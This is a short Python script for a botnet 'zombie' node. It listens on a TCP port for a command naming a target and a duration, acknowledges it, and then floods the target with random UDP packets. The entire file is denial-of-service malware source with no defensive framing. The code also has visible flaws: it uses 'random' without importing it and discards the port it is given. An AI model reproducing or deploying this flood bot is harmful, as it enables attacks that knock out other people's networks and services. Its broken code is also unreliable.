import SocketServer
import time
import socket
import os

class zombie(SocketServer.BaseRequestHandler):
    def handle(self):
        self.data = self.request.recv(1024).strip()
        timeout, target, port = self.data.split(" ")
        self.request.sendall("ACK")
        self.attack(float(timeout), target, int(port))

    def attack(self, timeout, target, port):
        victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        MESSAGE = os.urandom(100)

        start = time.clock()
        while time.clock() - start < timeout:
            port = random.randint(1, 65535)
            victim.sendto(MESSAGE, (target, port))

if __name__ == '__main__':
    HOST = socket.gethostbyname(socket.gethostname())
    PORT = 15000

    server = SocketServer.TCPServer((HOST, PORT), zombie)
    server.serve_forever()
